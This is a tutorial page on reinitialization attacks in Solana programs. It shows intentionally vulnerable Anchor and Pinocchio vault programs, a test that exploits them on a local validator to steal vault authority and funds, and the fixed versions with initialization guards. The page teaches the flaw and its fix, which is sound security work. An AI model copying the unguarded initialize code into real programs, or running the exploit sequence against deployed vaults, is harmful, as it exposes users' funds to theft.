---
title: "Reinitialization Attacks"
description: "How missing initialization guards allow attackers to overwrite account state and steal ownership"
icon: "repeat"
---

When an initialize function skips checking whether an account is already set up, anyone can call it again to overwrite the authority field and take full control of the vault.

## What we will build

In this tutorial we will:

- Deploy a **vulnerable** Anchor program that lacks an initialization guard, then exploit it to steal vault authority from another user
- Deploy a **secure** Anchor program that uses the `init` constraint to make reinitialization impossible
- Examine the same vulnerability and fix in a **Pinocchio** (no-framework) program, where we guard against reinitialization with a manual discriminator check

<Note>
**Prerequisites** -- Before starting, clone the repository and install dependencies:

```bash
git clone https://github.com/danielAsaboro/solana_badger.git
cd solana_badger
npm install
anchor build
```
</Note>

## Step 1 -- Read the vulnerable Anchor program

We start by looking at the program that has no protection. The `UnsafeInitialize` accounts struct declares the vault as an `UncheckedAccount` with only a `#[account(mut)]` constraint. The handler serializes a fresh `Vault` and copies the bytes straight into the account buffer.

<CodeGroup>
```rust unsafe_initialize.rs
use anchor_lang::prelude::*;
use anchor_lang::solana_program::system_program;
use crate::state::Vault;

pub fn unsafe_initialize(ctx: Context<UnsafeInitialize>) -> Result<()> {
    let mut writer: Vec<u8> = vec![];

    Vault {
        authority: ctx.accounts.authority.key(),
        balance: 0,
    }.try_serialize(&mut writer)?;

    let mut data = ctx.accounts.vault.try_borrow_mut_data()?;
    anchor_lang::solana_program::program_memory::sol_memcpy(
        &mut data,
        &writer,
        writer.len(),
    );

    msg!("Vault initialized (or RE-initialized!) with authority: {}", ctx.accounts.authority.key());
    Ok(())
}

#[derive(Accounts)]
pub struct UnsafeInitialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    /// CHECK: UNSAFE - no initialization check
    #[account(mut)]
    pub vault: UncheckedAccount<'info>,

    pub system_program: Program<'info, System>,
}
```

```rust state.rs
use anchor_lang::prelude::*;

#[account]
pub struct Vault {
    pub authority: Pubkey,
    pub balance: u64,
}

impl Vault {
    /// 8 bytes discriminator + 32 bytes pubkey + 8 bytes u64
    pub const LEN: usize = 8 + 32 + 8;
}
```

```rust lib.rs (dispatcher)
use anchor_lang::prelude::*;

declare_id!("BBQQXUoERwojEV7hSgSCMjsNvmv2nTKkdsMpRHuGXZjT");

pub mod instructions;
pub mod state;

pub use instructions::*;
pub use state::*;

#[program]
pub mod vulnerable_reinitialization_attacks {
    use super::*;

    pub fn unsafe_initialize(ctx: Context<UnsafeInitialize>) -> Result<()> {
        instructions::unsafe_initialize(ctx)
    }

    pub fn deposit(ctx: Context<Deposit>, amount: u64) -> Result<()> {
        instructions::deposit(ctx, amount)
    }

    pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
        instructions::withdraw(ctx, amount)
    }
}
```
</CodeGroup>

Notice that `UnsafeInitialize` performs zero validation on the vault account -- no discriminator check, no ownership check, no initialization guard. Calling the instruction on an already-initialized vault simply overwrites every field, including `authority`.

## Step 2 -- Exploit the vulnerability

We now write a test that demonstrates the full attack: Alice creates and funds a vault, then the attacker calls `unsafe_initialize` on the same account to replace Alice's authority with their own.

<CodeGroup>
```typescript tests/reinitialization-attacks.test.ts
import * as anchor from "@coral-xyz/anchor";
import BN from "bn.js";
import { Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import { assert } from "chai";
import type { VulnerableReinitializationAttacks } from "../target/types/vulnerable_reinitialization_attacks";
import type { SecureReinitializationAttacks } from "../target/types/secure_reinitialization_attacks";

describe("Vulnerability: Reinitialization Attacks", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const vulnerableProgram: anchor.Program<VulnerableReinitializationAttacks> =
    anchor.workspace.VulnerableReinitializationAttacks;
  const secureProgram: anchor.Program<SecureReinitializationAttacks> =
    anchor.workspace.SecureReinitializationAttacks;

  let alice: Keypair;
  let attacker: Keypair;
  let vulnerableVault: Keypair;
  let secureVault: Keypair;

  const DEPOSIT_AMOUNT = 1 * anchor.web3.LAMPORTS_PER_SOL;

  before(async () => {
    alice = Keypair.generate();
    attacker = Keypair.generate();
    vulnerableVault = Keypair.generate();
    secureVault = Keypair.generate();

    const airdropAmount = 5 * anchor.web3.LAMPORTS_PER_SOL;

    await provider.connection.requestAirdrop(alice.publicKey, airdropAmount);
    await provider.connection.requestAirdrop(attacker.publicKey, airdropAmount);

    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("      Setup complete:");
    console.log("      Alice:", alice.publicKey.toBase58());
    console.log("      Attacker:", attacker.publicKey.toBase58());
    console.log("      Vulnerable Vault:", vulnerableVault.publicKey.toBase58());
    console.log("      Secure Vault:", secureVault.publicKey.toBase58());
  });

  describe("Vulnerable Implementation (Anchor)", () => {
    it("allows attacker to reinitialize and steal vault authority", async () => {
      console.log("\n      EXPLOIT DEMONSTRATION:");

      // Step 1: Create vault account manually
      const vaultSize = 8 + 32 + 8;
      const lamports = await provider.connection.getMinimumBalanceForRentExemption(vaultSize);

      const createVaultTx = new Transaction().add(
        SystemProgram.createAccount({
          fromPubkey: alice.publicKey,
          newAccountPubkey: vulnerableVault.publicKey,
          lamports: lamports,
          space: vaultSize,
          programId: vulnerableProgram.programId,
        })
      );

      await sendAndConfirmTransaction(
        provider.connection,
        createVaultTx,
        [alice, vulnerableVault]
      );

      console.log("      1. Alice creates vault account...");

      // Step 2: Alice initializes her vault
      await vulnerableProgram.methods
        .unsafeInitialize()
        .accounts({
          authority: alice.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      2. Alice initializes vault with herself as authority");

      let vaultData = await vulnerableProgram.account.vault.fetch(vulnerableVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should be the initial authority"
      );
      console.log("      Verified: Alice is authority");

      // Step 3: Alice deposits SOL
      await vulnerableProgram.methods
        .deposit(new BN(DEPOSIT_AMOUNT))
        .accounts({
          depositor: alice.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      3. Alice deposits 1 SOL into vault");

      const vaultBalance = await provider.connection.getBalance(vulnerableVault.publicKey);
      console.log("      Vault balance:", vaultBalance / anchor.web3.LAMPORTS_PER_SOL, "SOL");

      // Step 4: Attacker reinitializes the vault
      console.log("\n      4. ATTACK: Attacker reinitializes the vault...");

      await vulnerableProgram.methods
        .unsafeInitialize()
        .accounts({
          authority: attacker.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      console.log("      VULNERABILITY CONFIRMED: Vault reinitialized!");

      vaultData = await vulnerableProgram.account.vault.fetch(vulnerableVault.publicKey);
      assert.ok(
        vaultData.authority.equals(attacker.publicKey),
        "Attacker should now be authority"
      );
      console.log("      Attacker is now the vault authority!");

      // Step 5: Attacker withdraws Alice's funds
      console.log("\n      5. Attacker withdraws Alice's funds...");

      const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);

      try {
        await vulnerableProgram.methods
          .withdraw(new BN(DEPOSIT_AMOUNT))
          .accounts({
            authority: attacker.publicKey,
            vault: vulnerableVault.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        const attackerBalanceAfter = await provider.connection.getBalance(attacker.publicKey);
        console.log("      Attacker successfully withdrew Alice's funds!");
        console.log("      Funds stolen:", (attackerBalanceAfter - attackerBalanceBefore) / anchor.web3.LAMPORTS_PER_SOL, "SOL");
      } catch (error: any) {
        console.log("      Note: Withdrawal may fail due to balance tracking,");
        console.log("      but the critical vulnerability is AUTHORITY THEFT.");
        console.log("      Attacker now controls the vault!");
      }

      console.log("\n      ATTACK RESULT:");
      console.log("      Original authority: Alice");
      console.log("      New authority:", vaultData.authority.toBase58(), "(Attacker)");
      console.log("      Alice has lost control of her vault!");
    });
  });

  describe("Secure Implementation (Anchor)", () => {
    it("prevents reinitialization with init constraint", async () => {
      console.log("\n      FIX DEMONSTRATION:");

      console.log("      1. Alice initializes secure vault...");

      await secureProgram.methods
        .initialize()
        .accounts({
          authority: alice.publicKey,
          vault: secureVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice, secureVault])
        .rpc();

      console.log("      Vault initialized with Alice as authority");

      let vaultData = await secureProgram.account.vault.fetch(secureVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should be authority"
      );

      await secureProgram.methods
        .deposit(new BN(DEPOSIT_AMOUNT))
        .accounts({
          depositor: alice.publicKey,
          vault: secureVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      2. Alice deposits 1 SOL");

      console.log("\n      3. ATTACK ATTEMPT: Attacker tries to reinitialize...");

      let attackFailed = false;
      let errorMessage = "";

      try {
        const attackerVault = Keypair.generate();

        await secureProgram.methods
          .initialize()
          .accounts({
            authority: attacker.publicKey,
            vault: secureVault.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        assert.fail("Expected reinitialization to fail");
      } catch (error: any) {
        attackFailed = true;
        errorMessage = error.toString();
        console.log("      FIX CONFIRMED: Reinitialization rejected!");
        console.log("      Error:", errorMessage.substring(0, 100) + "...");
      }

      assert.ok(attackFailed, "Reinitialization should have failed");

      vaultData = await secureProgram.account.vault.fetch(secureVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should still be authority"
      );
      console.log("      Alice is still the vault authority!");

      const vaultBalance = await provider.connection.getBalance(secureVault.publicKey);
      console.log("      Vault balance protected:", vaultBalance / anchor.web3.LAMPORTS_PER_SOL, "SOL");
    });
  });
});
```
</CodeGroup>

You will see output like this when the vulnerable test runs:

```bash
Vulnerability: Reinitialization Attacks
    Vulnerable Implementation (Anchor)
      EXPLOIT DEMONSTRATION:
      1. Alice creates vault account...
      2. Alice initializes vault with herself as authority
      Verified: Alice is authority
      3. Alice deposits 1 SOL into vault
      Vault balance: ~1.001 SOL

      4. ATTACK: Attacker reinitializes the vault...
      VULNERABILITY CONFIRMED: Vault reinitialized!
      Attacker is now the vault authority!

      5. Attacker withdraws Alice's funds...
      ATTACK RESULT:
      Original authority: Alice
      New authority: <attacker pubkey> (Attacker)
      Alice has lost control of her vault!
```

Notice that the attacker never needed Alice's signature. The `sol_memcpy` in step 4 overwrites the discriminator, the `authority` pubkey, and the `balance` field in one shot. Alice's authority is gone.

And when the secure implementation runs:

```bash
    Secure Implementation (Anchor)
      FIX DEMONSTRATION:
      1. Alice initializes secure vault...
      2. Alice deposits 1 SOL

      3. ATTACK ATTEMPT: Attacker tries to reinitialize...
      FIX CONFIRMED: Reinitialization rejected!
      Alice is still the vault authority!
      Vault balance protected: ~1.001 SOL
```

Notice that the attacker's transaction is rejected outright. Alice keeps her authority and her funds.

## Step 3 -- Apply the fix in Anchor

We replace `UncheckedAccount` with `Account<'info, Vault>` and apply the `init` constraint. This is the entire fix on the Anchor side.

<CodeGroup>
```rust Vulnerable (unsafe_initialize.rs)
#[derive(Accounts)]
pub struct UnsafeInitialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    /// CHECK: UNSAFE - no initialization check
    #[account(mut)]
    pub vault: UncheckedAccount<'info>,

    pub system_program: Program<'info, System>,
}
```

```rust Secure (initialize.rs)
use anchor_lang::prelude::*;
use crate::state::Vault;

pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    let vault = &mut ctx.accounts.vault;
    vault.authority = ctx.accounts.authority.key();
    vault.balance = 0;

    msg!("Vault securely initialized with authority: {}", vault.authority);
    Ok(())
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = Vault::LEN
    )]
    pub vault: Account<'info, Vault>,

    pub system_program: Program<'info, System>,
}
```
</CodeGroup>

The `init` constraint does three things that together eliminate the vulnerability:

1. It checks that the account's discriminator bytes are all zeros before proceeding -- if the account is already initialized, the transaction fails immediately.
2. It calls `create_account` via CPI to the System Program, which itself will fail if the account already exists with data.
3. After writing the struct fields, it stamps the 8-byte Anchor discriminator into the account, permanently marking it as initialized.

## Step 4 -- Read the vulnerable Pinocchio program

In the no-framework version, we define the account layout manually. Byte 0 is a discriminator, bytes 1--32 hold the authority pubkey, and bytes 33--40 hold the balance. The vulnerable implementation writes all of these fields without ever checking whether the discriminator is already set.

<CodeGroup>
```rust Vulnerable lib.rs
#![no_std]

#[cfg(not(feature = "no-entrypoint"))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

use pinocchio::{
    entrypoint,
    AccountView,
    Address,
    ProgramResult,
};
use solana_program_error::ProgramError;

pub mod state;
use state::Vault;

const ID: Address = Address::new_from_array([
    0xd1, 0x6c, 0x7e, 0x1f, 0x8a, 0xb3, 0x4c, 0x5d,
    0xe9, 0x2a, 0x1b, 0xf6, 0xc3, 0x7d, 0x4e, 0x8f,
    0xa5, 0xb6, 0xc7, 0xd8, 0xe9, 0xfa, 0x0b, 0x1c,
    0x2d, 0x3e, 0x4f, 0x50, 0x61, 0x72, 0x83, 0x94,
]);

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Address,
    accounts: &[AccountView],
    instruction_data: &[u8],
) -> ProgramResult {
    if program_id != &ID {
        return Err(ProgramError::IncorrectProgramId);
    }

    match instruction_data.first() {
        Some(&0) => unsafe_initialize(accounts),
        _ => Err(ProgramError::InvalidInstructionData),
    }
}

fn unsafe_initialize(accounts: &[AccountView]) -> ProgramResult {
    let [authority_info, vault_info] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    if !authority_info.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if !vault_info.owned_by(&ID) {
        return Err(ProgramError::InvalidAccountOwner);
    }

    let mut data = vault_info.try_borrow_mut()?;

    if data.len() < Vault::LEN {
        return Err(ProgramError::AccountDataTooSmall);
    }

    // No check whether discriminator is already set!
    data[0] = Vault::DISCRIMINATOR;
    data[1..33].copy_from_slice(authority_info.address().as_ref());
    data[33..41].fill(0);

    Ok(())
}
```

```rust Vulnerable state.rs
pub struct Vault;

impl Vault {
    pub const LEN: usize = 1 + 32 + 8; // 41 bytes total
    pub const DISCRIMINATOR: u8 = 1;
}
```
</CodeGroup>

Notice that `data[0]` is unconditionally overwritten. An attacker who knows the vault's address can call `unsafe_initialize` and replace `data[1..33]` with their own pubkey.

## Step 5 -- Apply the fix in Pinocchio

We add exactly one guard: read `data[0]` and return `AccountAlreadyInitialized` if the discriminator is already set.

<CodeGroup>
```rust Secure lib.rs
#![no_std]

#[cfg(not(feature = "no-entrypoint"))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

use pinocchio::{
    entrypoint,
    AccountView,
    Address,
    ProgramResult,
};
use solana_program_error::ProgramError;

pub mod state;
use state::Vault;

const ID: Address = Address::new_from_array([
    0x3e, 0x2d, 0x1c, 0x0b, 0xfa, 0xe9, 0xd8, 0xc7,
    0xb6, 0xa5, 0x94, 0x83, 0x72, 0x61, 0x50, 0x4f,
    0x3e, 0x2d, 0x1c, 0x0b, 0xfa, 0xe9, 0xd8, 0xc7,
    0xb6, 0xa5, 0x94, 0x83, 0x72, 0x61, 0x50, 0x4f,
]);

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Address,
    accounts: &[AccountView],
    instruction_data: &[u8],
) -> ProgramResult {
    if program_id != &ID {
        return Err(ProgramError::IncorrectProgramId);
    }

    match instruction_data.first() {
        Some(&0) => initialize(accounts),
        _ => Err(ProgramError::InvalidInstructionData),
    }
}

fn initialize(accounts: &[AccountView]) -> ProgramResult {
    let [authority_info, vault_info] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    if !authority_info.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if !vault_info.owned_by(&ID) {
        return Err(ProgramError::InvalidAccountOwner);
    }

    let mut data = vault_info.try_borrow_mut()?;

    if data.len() < Vault::LEN {
        return Err(ProgramError::AccountDataTooSmall);
    }

    // FIX: reject if already initialized
    if data[0] == Vault::DISCRIMINATOR {
        return Err(ProgramError::AccountAlreadyInitialized);
    }

    data[0] = Vault::DISCRIMINATOR;
    data[1..33].copy_from_slice(authority_info.address().as_ref());
    data[33..41].fill(0);

    Ok(())
}
```

```rust Secure state.rs
pub struct Vault;

impl Vault {
    pub const LEN: usize = 1 + 32 + 8; // 41 bytes total
    pub const DISCRIMINATOR: u8 = 1;
}
```
</CodeGroup>

The fix is three lines:

```rust
if data[0] == Vault::DISCRIMINATOR {
    return Err(ProgramError::AccountAlreadyInitialized);
}
```

If Alice has already initialized her vault, `data[0]` is `1`. When the attacker calls `initialize`, the function reads `data[0]`, sees it equals `Vault::DISCRIMINATOR`, and returns an error before any data is written. Alice's authority is never touched.

## Side-by-side comparison

<Tabs>
  <Tab title="Anchor">
    **Vulnerable:** Uses `UncheckedAccount` and manual `sol_memcpy` with no init guard.

    ```rust
    #[account(mut)]
    /// CHECK: UNSAFE
    pub vault: UncheckedAccount<'info>,
    ```

    **Secure:** Uses `Account<'info, Vault>` with the `init` constraint.

    ```rust
    #[account(
        init,
        payer = authority,
        space = Vault::LEN
    )]
    pub vault: Account<'info, Vault>,
    ```

    The `init` constraint handles discriminator validation, account creation, and rent payment automatically.
  </Tab>

  <Tab title="Pinocchio">
    **Vulnerable:** Writes directly to the data buffer without reading the discriminator.

    ```rust
    data[0] = Vault::DISCRIMINATOR;
    data[1..33].copy_from_slice(authority_info.address().as_ref());
    data[33..41].fill(0);
    ```

    **Secure:** Reads `data[0]` and returns an error if the account is already initialized.

    ```rust
    if data[0] == Vault::DISCRIMINATOR {
        return Err(ProgramError::AccountAlreadyInitialized);
    }

    data[0] = Vault::DISCRIMINATOR;
    data[1..33].copy_from_slice(authority_info.address().as_ref());
    data[33..41].fill(0);
    ```

    Without a framework to enforce initialization guards, every Pinocchio program must manually validate the discriminator before writing to any account for the first time.
  </Tab>
</Tabs>

## Key takeaways

- **Always use the `init` constraint in Anchor.** It checks the discriminator, creates the account, and stamps the discriminator in one atomic operation.
- **In Pinocchio, check the discriminator before every write in an initialization function.** A single `if data[0] == DISCRIMINATOR { return Err(...) }` prevents total loss of funds.
- **PDAs are deterministic and publicly derivable.** Security comes from initialization guards, not from address obscurity.
- **Reinitialization steals authority, not just data.** By overwriting the `authority` field, the attacker gains full control and can call `withdraw` at their leisure.
- **Test both directions.** Verify that initialization works for the first caller, and verify that a second call from a different signer fails.

## Run it yourself

```bash
git clone https://github.com/danielAsaboro/solana_badger.git
cd solana_badger
npm install
anchor build

# Run the Anchor reinitialization tests
anchor test -- --grep "Reinitialization"

# Run the Pinocchio reinitialization tests
npx jest tests/pinocchio/reinitialization.pinocchio.test.ts
```

You will see the vulnerable test pass (confirming the exploit works) and the secure test pass (confirming the fix blocks reinitialization). Both suites should print green checkmarks.
